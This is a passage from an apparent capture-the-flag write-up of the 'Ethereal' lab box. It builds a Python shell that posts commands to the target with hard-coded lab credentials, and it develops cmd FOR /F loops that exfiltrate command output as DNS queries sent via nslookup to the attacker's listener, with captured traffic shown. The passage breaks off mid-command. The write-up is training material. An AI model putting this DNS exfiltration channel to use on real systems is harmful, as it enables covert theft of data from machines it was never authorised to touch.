+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">(Pdb)</span><span class="w"> </span><span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__VIEWSTATE</span><span class="sh">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">)</span>
+<span class="go">'/wEPDwULLTE0OTYxODU3NjhkZDq+FRgU9epds8vdzQCOhWx4WFqAM2hNIbgH2RI3jXSz'
+</span></code></pre></div></div>
+<p>I can also get the other parameters:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">(Pdb)</span><span class="w"> </span><span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__VIEWSTATEGENERATOR</span><span class="sh">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">)</span>
+<span class="go">'CA0B0334'
+</span><span class="gp">(Pdb)</span><span class="w"> </span><span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__EVENTVALIDATION</span><span class="sh">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">)</span>
+<span class="go">'/wEdAAOFr9TrHWt+2bA4FwNr3j1Y4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p+9jPAN9kKYZ9rDh9NVw3pnVFLEyhi/zP9ndEQ4bcuvdL5zBCfg=='
+</span></code></pre></div></div>
+<p>Now that I know how to get the values, I’ll add that to my <code class="language-plaintext highlighter-rouge">__init__()</code> (and remove printing the response):</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">32</span>     <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">):</span>
+ <span class="mi">33</span>         <span class="nf">super</span><span class="p">().</span><span class="nf">__init__</span><span class="p">()</span>
+ <span class="mi">34</span>         <span class="n">auth</span> <span class="o">=</span> <span class="nc">HTTPBasicAuth</span><span class="p">(</span><span class="sh">'</span><span class="s">alan</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">!C414m17y57r1k3s4g41n!</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">35</span>         <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://ethereal.htb:8080/</span><span class="sh">'</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">auth</span><span class="p">)</span>
+ <span class="mi">36</span>         <span class="n">soup</span> <span class="o">=</span> <span class="nc">BeautifulSoup</span><span class="p">(</span><span class="n">resp</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="sh">'</span><span class="s">html.parser</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">37</span>         <span class="n">self</span><span class="p">.</span><span class="n">view_state</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__VIEWSTATE</span><span class="sh">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">38</span>         <span class="n">self</span><span class="p">.</span><span class="n">view_state_gen</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__VIEWSTATEGENERATOR</span><span class="sh">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">39</span>         <span class="n">self</span><span class="p">.</span><span class="n">event_val</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="nf">find</span><span class="p">(</span><span class="sh">"</span><span class="s">input</span><span class="sh">"</span><span class="p">,</span> <span class="nb">id</span><span class="o">=</span><span class="sh">"</span><span class="s">__EVENTVALIDATION</span><span class="sh">"</span><span class="p">).</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">value</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<h3 id="send-post">Send POST</h3>
+<h4 id="add-proxy">Add Proxy</h4>
+<p>I want to be able to send requests through a proxy. I’ll I define that when I create the terminal by adding it as a parameter of <code class="language-plaintext highlighter-rouge">__init__</code>. I’ll have the default be no proxy, but for now I’ll create the terminal with Burp as my proxy:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">32</span>     <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">proxy</span><span class="o">=</span><span class="bp">None</span><span class="p">):</span>
+ <span class="mi">33</span>         <span class="nf">super</span><span class="p">().</span><span class="nf">__init__</span><span class="p">()</span>
+ <span class="mi">34</span>         <span class="n">self</span><span class="p">.</span><span class="n">proxy</span> <span class="o">=</span> <span class="n">proxy</span> <span class="ow">or</span> <span class="p">{}</span>
+ <span class="mi">35</span>         <span class="n">self</span><span class="p">.</span><span class="n">auth</span> <span class="o">=</span> <span class="nc">HTTPBasicAuth</span><span class="p">(</span><span class="sh">'</span><span class="s">alan</span><span class="sh">'</span><span class="p">,</span><span class="sh">'</span><span class="s">!C414m17y57r1k3s4g41n!</span><span class="sh">'</span><span class="p">)</span>
+ <span class="mi">36</span>         <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="sh">'</span><span class="s">http://ethereal.htb:8080/</span><span class="sh">'</span><span class="p">,</span> <span class="n">auth</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">auth</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">proxy</span><span class="p">)</span>
+ <span class="bp">...</span>
+ <span class="mi">46</span> <span class="n">term</span> <span class="o">=</span> <span class="nc">Terminal</span><span class="p">(</span><span class="n">proxy</span><span class="o">=</span><span class="p">{</span><span class="sh">"</span><span class="s">http</span><span class="sh">"</span><span class="p">:</span> <span class="sh">"</span><span class="s">http://127.0.0.1:8080</span><span class="sh">"</span><span class="p">})</span>
+ <span class="mi">47</span> <span class="n">term</span><span class="p">.</span><span class="nf">cmdloop</span><span class="p">()</span>
+</code></pre></div></div>
+<h4 id="post-function">POST Function</h4>
+<p>Now I want to send a post to the page. I’ll create a function to do that, as I may use this in multiple commands inside my terminal. The POST sends five parameters, three of which I’ve already collected at initiation, and one of which is empty:</p>
+<div class="language-http wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">__VIEWSTATE=%2FwEPDwULLTE0OTYxODU3NjhkZDq%2BFRgU9epds8vdzQCOhWx4WFqAM2hNIbgH2RI3jXSz&amp;__VIEWSTATEGENERATOR=CA0B0334&amp;__EVENTVALIDATION=%2FwEdAAOFr9TrHWt%2B2bA4FwNr3j1Y4CgZUgk3s462EToPmqUw3OKvLNdlnDJuHW3p%2B9jPAN9kKYZ9rDh9NVw3pnVFLEyhi%2FzP9ndEQ4bcuvdL5zBCfg%3D%3D&amp;search=127.0.0.1&amp;ctl02=
+</span></code></pre></div></div>
+<p>I just need to pass in a <code class="language-plaintext highlighter-rouge">search</code> parameter.</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">43</span>     <span class="k">def</span> <span class="nf">send_post</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">search</span><span class="p">):</span>
+ <span class="mi">44</span>         <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="sh">'</span><span class="s">__VIEWSTATE</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">view_state</span><span class="p">,</span>
+ <span class="mi">45</span>                 <span class="sh">'</span><span class="s">__VIEWSTATEGENERATOR</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">view_state_gen</span><span class="p">,</span>
+ <span class="mi">46</span>                 <span class="sh">'</span><span class="s">__EVENTVALIDATION</span><span class="sh">'</span><span class="p">:</span> <span class="n">self</span><span class="p">.</span><span class="n">event_val</span><span class="p">,</span>
+ <span class="mi">47</span>                 <span class="sh">'</span><span class="s">search</span><span class="sh">'</span><span class="p">:</span> <span class="n">search</span><span class="p">,</span>
+ <span class="mi">48</span>                 <span class="sh">'</span><span class="s">ctl02</span><span class="sh">'</span><span class="p">:</span> <span class="sh">''</span><span class="p">}</span>
+ <span class="mi">49</span>         <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="nf">post</span><span class="p">(</span><span class="sh">'</span><span class="s">http://ethereal.htb:8080/</span><span class="sh">'</span><span class="p">,</span>
+ <span class="mi">50</span>                              <span class="n">proxies</span><span class="o">=</span><span class="n">self</span><span class="p">.</span><span class="n">proxy</span><span class="p">,</span>
+ <span class="mi">51</span>                              <span class="n">data</span> <span class="o">=</span> <span class="n">data</span><span class="p">,</span>
+ <span class="mi">52</span>                              <span class="n">auth</span> <span class="o">=</span> <span class="n">self</span><span class="p">.</span><span class="n">auth</span><span class="p">)</span>
+</code></pre></div></div>
+<p>I can test this by adding this to the default command:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="mi">55</span>     <span class="k">def</span> <span class="nf">default</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">args</span><span class="p">):</span>
+ <span class="mi">56</span>         <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Entered: </span><span class="si">{</span><span class="n">args</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
+ <span class="mi">57</span>         <span class="n">self</span><span class="p">.</span><span class="nf">send_post</span><span class="p">(</span><span class="n">search</span><span class="o">=</span><span class="sh">'</span><span class="s">127.0.0.1</span><span class="sh">'</span><span class="p">)</span>
+</code></pre></div></div>
+<p>I’ll enter any command, and then check burp to make sure that the request worked, and that I see <code class="language-plaintext highlighter-rouge">Connection to host successful</code> in the response.</p>
+<h2 id="command-output-to-nslookup">Command Output to nslookup</h2>
+<h3 id="command-for-loops">Command For Loops</h3>
+<p>In Ethereal, I was able to get <code class="language-plaintext highlighter-rouge">nslookup</code> to query me for a domain I gave it. Now I want to run a command and have the output encoded as a domain that can be queried. To do that, I’ll need to understand how <code class="language-plaintext highlighter-rouge">for</code> loops work in cmd, specifically with <code class="language-plaintext highlighter-rouge">/F</code>, which is used to loop over results of commands (<a href="https://ss64.com/nt/for_cmd.html">this is a good reference</a>).</p>
+<p>It will take the form:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kr">FOR</span><span class="w"> </span><span class="n">/F</span><span class="w"> </span><span class="p">[</span><span class="s2">"options"</span><span class="p">]</span><span class="w"> </span><span class="o">%%</span><span class="nx">parameter</span><span class="w"> </span><span class="nx">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">'command_to_process'</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="kr">command</span><span class="w">
+</span></code></pre></div></div>
+<p>I’m going to define the tokens as 1-26, and then let the parameter be <code class="language-plaintext highlighter-rouge">%a</code> so I can use lowercase letters to represent the values.</p>
+<p>I’ll start with some examples on a Windows VM. I’ll run a simple <code class="language-plaintext highlighter-rouge">dir</code> in an empty directory:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf\test&gt;</span><span class="nb">dir</span>
+<span class="go"> Volume in drive C has no label.
+ Volume Serial Number is F06E-7663
+
+ Directory of C:\Users\0xdf\test
+
+02/25/2019  07:04 AM    &lt;DIR&gt;          .
+02/25/2019  07:04 AM    &lt;DIR&gt;          ..
+               0 File(s)              0 bytes
+               2 Dir(s)   4,890,824,704 bytes free
+</span></code></pre></div></div>
+<p>Since the default delimiter is space, here’s how the loop will see this same output as tokens:</p>
+<p><img alt="1551107748691" src="https://0xdfimages.gitlab.io/img/1551107748691.png"/></p>
+<p>You can see this if I run it through a loop. Here’s the specifics:</p>
+<ul>
+<li><code class="language-plaintext highlighter-rouge">for /f</code> - Loop over command output</li>
+<li><code class="language-plaintext highlighter-rouge">"tokens=1-26"</code> - Get up to 26 tokens</li>
+<li><code class="language-plaintext highlighter-rouge">%a</code> - Defines the tokens as <code class="language-plaintext highlighter-rouge">%[lowercase]</code>, where <code class="language-plaintext highlighter-rouge">%a</code> is explicitly declared, and the rest are implicitly declared</li>
+<li><code class="language-plaintext highlighter-rouge">in ('dir')</code> - The command to run</li>
+<li><code class="language-plaintext highlighter-rouge">echo %a</code> - What to do with the resulting tokens</li>
+<li><code class="language-plaintext highlighter-rouge">@echo off</code> and <code class="language-plaintext highlighter-rouge">@echo on</code> - Prevent a bunch of noise from printing</li>
+</ul>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf\test&gt;</span>@echo off &amp; <span class="o">(</span><span class="k">for</span> /f <span class="s2">"tokens=1-26"</span> %a <span class="k">in</span> <span class="o">(</span><span class="s1">'dir'</span><span class="o">)</span> DO <span class="nb">echo</span> %a<span class="o">)</span> &amp; @echo on
+<span class="go">Volume
+Volume
+Directory
+02/25/2019
+02/25/2019
+0
+2
+</span></code></pre></div></div>
+<p>That output matches nicely with the red box in the image above. I can get <code class="language-plaintext highlighter-rouge">%c</code> to get the pink:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf\test&gt;</span>@echo off &amp; <span class="o">(</span><span class="k">for</span> /f <span class="s2">"tokens=1-26"</span> %a <span class="k">in</span> <span class="o">(</span><span class="s1">'dir'</span><span class="o">)</span> DO <span class="nb">echo</span> %c<span class="o">)</span> &amp; @echo on
+<span class="go">drive
+Number
+C:\Users\0xdf\test
+AM
+AM
+0
+4,917,178,368
+</span></code></pre></div></div>
+<p>I can also combine tokes as I see fit (a silly example):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf\test&gt;</span>@echo off &amp; <span class="o">(</span><span class="k">for</span> /f <span class="s2">"tokens=1-26"</span> %a <span class="k">in</span> <span class="o">(</span><span class="s1">'dir'</span><span class="o">)</span> DO <span class="nb">echo</span> %c-%b___%a<span class="o">)</span> &amp; @echo on
+<span class="go">drive-in___Volume
+Number-Serial___Volume
+C:\Users\0xdf\test-of___Directory
+AM-07:04___02/25/2019
+AM-07:04___02/25/2019
+0-File(s)___0
+4,917,182,464-Dir(s)___2
+</span></code></pre></div></div>
+<h3 id="nslookup-basics">nslookup Basics</h3>
+<p>Now I’ll use what I know about looping to generate <code class="language-plaintext highlighter-rouge">nsloopup</code> commands. If I start with this loop:</p>
+<div class="language-console wrap highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf\test&gt;</span><span class="w"> </span><span class="k">for</span> /f <span class="s2">"tokens=1-26"</span> %a <span class="k">in</span> <span class="o">(</span><span class="s1">'dir'</span><span class="o">)</span> DO <span class="o">(</span>nslookup %a.%b.%c. 10.1.1.41<span class="o">)</span>
+</code></pre></div></div>
+<p>Here’s what I see in <code class="language-plaintext highlighter-rouge">tcpdump</code>:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>tcpdump <span class="nt">-ni</span> eth0 udp port 53
+<span class="go">tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
+listening on eth0, link-type EN10MB (Ethernet), capture size 262144 bytes
+11:35:55.294278 IP 10.1.1.153.56258 &gt; 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
+11:35:55.296505 IP 10.1.1.153.56259 &gt; 10.1.1.41.53: 2+ A? Volume.in.drive. (33)
+11:35:55.296723 IP 10.1.1.153.56260 &gt; 10.1.1.41.53: 3+ AAAA? Volume.in.drive. (33)
+11:35:55.318089 IP 10.1.1.153.56261 &gt; 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
+11:35:55.319970 IP 10.1.1.153.56262 &gt; 10.1.1.41.53: 2+ A? Volume.Serial.Number. (38)
+11:35:55.320227 IP 10.1.1.153.56263 &gt; 10.1.1.41.53: 3+ AAAA? Volume.Serial.Number. (38)
+11:35:55.339339 IP 10.1.1.153.56264 &gt; 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
+11:35:57.338883 IP 10.1.1.153.56265 &gt; 10.1.1.41.53: 2+ A? Directory.of.C:Users0xdftest. (46)
+11:35:57.339221 IP 10.1.1.153.56266 &gt; 10.1.1.41.53: 3+ AAAA? Directory.of.C:Users0xdftest. (46)
+11:35:57.364436 IP 10.1.1.153.56267 &gt; 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
+11:35:59.364047 IP 10.1.1.153.56268 &gt; 10.1.1.41.53: 2+ A? 02/25/2019.07:04.AM. (37)
+11:35:59.365326 IP 10.1.1.153.56269 &gt; 10.1.1.41.53: 3+ AAAA? 02/25/2019.07:04.AM. (37)
+11:35:59.423620 IP 10.1.1.153.56270 &gt; 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
+11:36:01.426274 IP 10.1.1.153.56271 &gt; 10.1.1.41.53: 2+ A? 02/25/2019.07:04.AM. (37)
+11:36:01.427472 IP 10.1.1.153.56272 &gt; 10.1.1.41.53: 3+ AAAA? 02/25/2019.07:04.AM. (37)
+11:36:01.476957 IP 10.1.1.153.56273 &gt; 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
+11:36:03.487602 IP 10.1.1.153.56274 &gt; 10.1.1.41.53: 2+ A? 0.File(s).0. (29)
+11:36:03.489038 IP 10.1.1.153.56275 &gt; 10.1.1.41.53: 3+ AAAA? 0.File(s).0. (29)
+11:36:03.537786 IP 10.1.1.153.56276 &gt; 10.1.1.41.53: 1+ PTR? 41.1.1.10.in-addr.arpa. (40)
+11:36:05.527818 IP 10.1.1.153.56277 &gt; 10.1.1.41.53: 2+ A? 2.Dir(s).4,917,108,736. (40)
+11:36:05.528172 IP 10.1.1.153.56278 &gt; 10.1.1.41.53: 3+ AAAA? 2.Dir(s).4,917,108,736. (40)
+</span></code></pre></div></div>
+<p>If I grep out just the A records:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">11:35:55.296505 IP 10.1.1.153.56259 &gt; 10.1.1.41.53: 2+ A? Volume.in.drive. (33)
+11:35:55.319970 IP 10.1.1.153.56262 &gt; 10.1.1.41.53: 2+ A? Volume.Serial.Number. (38)
+11:35:57.338883 IP 10.1.1.153.56265 &gt; 10.1.1.41.53: 2+ A? Directory.of.C:Users0xdftest. (46)
+11:35:59.364047 IP 10.1.1.153.56268 &gt; 10.1.1.41.53: 2+ A? 02/25/2019.07:04.AM. (37)
+11:36:01.426274 IP 10.1.1.153.56271 &gt; 10.1.1.41.53: 2+ A? 02/25/2019.07:04.AM. (37)
+11:36:03.487602 IP 10.1.1.153.56274 &gt; 10.1.1.41.53: 2+ A? 0.File(s).0. (29)
+11:36:05.527818 IP 10.1.1.153.56277 &gt; 10.1.1.41.53: 2+ A? 2.Dir(s).4,917,108,736. (40)
+</span></code></pre></div></div>
+<p>So I’m getting the start of the dir list.</p>
+<h3 id="nslookup-command-output">nslookup Command Output</h3>
+<p>Now I’ll send full command output over dns. I’ll comment out the terminal lines at the end of <code class="language-plaintext highlighter-rouge">ethereal_shell.py</code> that that I’m just running the dns part, and run it.</p>
+<p>Now I’ll try to get the output of a dir command. I’ll use the full 26 tokens, and run something like this: <code class="language-plaintext highlighter-rouge">FOR /F "tokens=1-26" %a IN ('dir /x .') DO ( nslookup %a.%b.%c.%d.%e.%f.%g.%h.%i.%j.%k.%l.%m.%n.%o.%p.%q.%r.%s.%t.%u.%v.%w.%x.%y.%z 10.1.1.41</code>. The idea is to do a <code class="language-plaintext highlighter-rouge">dir</code> (with <code class="language-plaintext highlighter-rouge">/x</code> to get long and short file names), and for each line, break it on whitespace, and send it out with each word being a subdomain in the dns lookup. But this fails (errors on Windows VM and nothing on Kali listener):</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf\test&gt;</span><span class="err">@</span><span class="n">echo</span><span class="w"> </span><span class="nx">off</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="p">(</span><span class="kr">FOR</span><span class="w"> </span><span class="n">/F</span><span class="w"> </span><span class="s2">"tokens=1-26"</span><span class="w"> </span><span class="o">%</span><span class="nx">a</span><span class="w"> </span><span class="nx">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">'dir /x .'</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">nslookup</span><span class="w"> </span><span class="o">%</span><span class="nx">a.</span><span class="o">%</span><span class="nx">b.</span><span class="o">%</span><span class="nx">c.</span><span class="o">%</span><span class="nx">d.</span><span class="o">%</span><span class="nx">e.</span><span class="o">%</span><span class="nx">f.</span><span class="o">%</span><span class="nx">g.</span><span class="o">%</span><span class="nx">h.</span><span class="o">%</span><span class="nx">i.</span><span class="o">%</span><span class="nx">j.</span><span class="o">%</span><span class="nx">k.</span><span class="o">%</span><span class="nx">l.</span><span class="o">%</span><span class="nx">m.</span><span class="o">%</span><span class="nx">n.</span><span class="o">%</span><span class="nx">o.</span><span class="o">%</span><span class="nx">p.</span><span class="o">%</span><span class="nx">q.</span><span class="o">%</span><span class="nx">r.</span><span class="o">%</span><span class="nx">s.</span><span class="o">%</span><span class="nx">t.</span><span class="o">%</span><span class="nx">u.</span><span class="o">%</span><span class="nx">v.</span><span class="o">%</span><span class="nx">w.</span><span class="o">%</span><span class="nx">x.</span><span class="o">%</span><span class="nx">y.</span><span class="o">%</span><span class="nx">z</span><span class="w"> </span><span class="nx">10.1.1.41</span><span class="p">))</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="err">@</span><span class="nx">echo</span><span class="w"> </span><span class="nx">on</span><span class="w">
+</span><span class="go">Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find Volume.in.drive.C.has.no.label....................: Unspecified error
+Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find Volume.Serial.Number.is.F06E-7663.....................: Unspecified error
+Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find Directory.of.C:\Users\0xdf\test.......................: Unspecified error
+Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find 02/25/2019.07:04.AM.&lt;DIR&gt;.......................: Unspecified error
+Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find 02/25/2019.07:04.AM.&lt;DIR&gt;........................: Unspecified error
+Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find 0.File(s).0.bytes......................: Unspecified error
+DNS request timed out.
+    timeout was 2 seconds.
+Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find 2.Dir(s).4,913,123,328.bytes.free.....................: Unspecified error
+</span></code></pre></div></div>
+<p>The reason it fails is because you can’t have two <code class="language-plaintext highlighter-rouge">.</code> in a row in a valid domain name. I’ll fix that by including a single character in before each token. That way, an empty token will still produce that character, and I can just remove it on the receiving end.</p>
+<p>In the real thing, I’ll use the same character for each token, but for demonstration, I’ll show this one with each token having a different character. I’ll show the dir, and then the output from running the loop over it:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">C:\Users\0xdf\test&gt;</span><span class="n">dir</span><span class="w"> </span><span class="nx">/x</span><span class="w">
+</span><span class="go"> Volume in drive C has no label.
+ Volume Serial Number is F06E-7663
+
+ Directory of C:\Users\0xdf\test
+
+02/25/2019  07:04 AM    &lt;DIR&gt;                       .
+02/25/2019  07:04 AM    &lt;DIR&gt;                       ..
+               0 File(s)              0 bytes
+               2 Dir(s)   4,913,123,328 bytes free
+
+</span><span class="gp">C:\Users\0xdf\test&gt;</span><span class="err">@</span><span class="n">echo</span><span class="w"> </span><span class="nx">off</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="p">(</span><span class="kr">FOR</span><span class="w"> </span><span class="n">/F</span><span class="w"> </span><span class="s2">"tokens=1-26"</span><span class="w"> </span><span class="o">%</span><span class="nx">a</span><span class="w"> </span><span class="nx">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">'dir /x .'</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">nsl</span><span class="w">
+</span><span class="go">ookup "A%a.B%b.C%c.D%d.E%e.F%f.G%g.H%h.I%i.J%j.K%k.L%l.M%m.N%n.O%o.P%p.Q%q.R%r.S
+%s.T%t.U%u.V%v.W%w.X%x.Y%y.Z%z" 10.1.1.41)) &amp; @echo on
+Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find AVolume.Bin.Cdrive.DC.Ehas.Fno.Glabel..H.I.J.K.L.M.N.O.P.
+Q.R.S.T.U.V.W.X.Y.Z: Unspecified error
+Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find AVolume.BSerial.CNumber.Dis.EF06E-7663.F.G.H.I.J.K.L.M.N.
+O.P.Q.R.S.T.U.V.W.X.Y.Z: No response from server
+Server:  UnKnown
+Address:  10.1.1.41
+
+DNS request timed out.
+    timeout was 2 seconds.
+*** UnKnown can't find ADirectory.Bof.CC:\Users\0xdf\test.D.E.F.G.H.I.J.K.L.M.N.
+O.P.Q.R.S.T.U.V.W.X.Y.Z: No response from server
+Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find A02/25/2019.B07:04.CAM.D&lt;DIR&gt;.E..F.G.H.I.J.K.L.M.N.O.P.Q.
+R.S.T.U.V.W.X.Y.Z: Unspecified error
+Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find A02/25/2019.B07:04.CAM.D&lt;DIR&gt;.E...F.G.H.I.J.K.L.M.N.O.P.Q
+.R.S.T.U.V.W.X.Y.Z: Unspecified error
+DNS request timed out.
+    timeout was 2 seconds.
+Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find A0.BFile(s).C0.Dbytes.E.F.G.H.I.J.K.L.M.N.O.P.Q.R.S.T.U.V
+.W.X.Y.Z: No response from server
+DNS request timed out.
+    timeout was 2 seconds.
+Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find A2.BDir(s).C4,913,123,328.Dbytes.Efree.F.G.H.I.J.K.L.M.N.
+O.P.Q.R.S.T.U.V.W.X.Y.Z: No response from server
+</span></code></pre></div></div>
+<p>Here’s what I received at my shell:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="gp">root@kali# </span>./ethereal_shell.py 
+<span class="go">AVolume.BSerial.CNumber.Dis.EF06E-7663.F.G.H.I.J.K.L.M.N.O.P.Q.R.S.T.U.V.W.X.Y.Z.
+ADirectory.Bof.CC:Users0xdftest.D.E.F.G.H.I.J.K.L.M.N.O.P.Q.R.S.T.U.V.W.X.Y.Z.
+A0.BFile(s).C0.Dbytes.E.F.G.H.I.J.K.L.M.N.O.P.Q.R.S.T.U.V.W.X.Y.Z.
+A2.BDir(s).C4,913,123,328.Dbytes.Efree.F.G.H.I.J.K.L.M.N.O.P.Q.R.S.T.U.V.W.X.Y.Z.
+</span></code></pre></div></div>
+<p>There were seven lines in the dir, but only four reached me. I’ll look closer at one of the lines that had an error:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">Server:  UnKnown
+Address:  10.1.1.41
+
+*** UnKnown can't find A02/25/2019.B07:04.CAM.D&lt;DIR&gt;.E..F.G.H.I.J.K.L.M.N.O.P.Q.
+R.S.T.U.V.W.X.Y.Z: Unspecified error
+</span></code></pre></div></div>
+<p>That would have been this line:</p>
+<div class="language-console highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="go">02/25/2019  07:04 AM    &lt;DIR&gt;                       .
+</span></code></pre></div></div>
+<p>So the token that ended with a <code class="language-plaintext highlighter-rouge">.</code> led to two in a row, and therefore an invalid domain. That happened three times.</p>
+<p>I can make this somewhat better by putting a letter before and after the token:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">(</span><span class="kr">FOR</span><span class="w"> </span><span class="n">/F</span><span class="w"> </span><span class="s2">"tokens=1-26"</span><span class="w"> </span><span class="o">%</span><span class="nx">a</span><span class="w"> </span><span class="nx">IN</span><span class="w"> </span><span class="p">(</span><span class="s1">'dir /x'</span><span class="p">)</span><span class="w"> </span><span class="kr">DO</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">nsloo</span><span class="w">
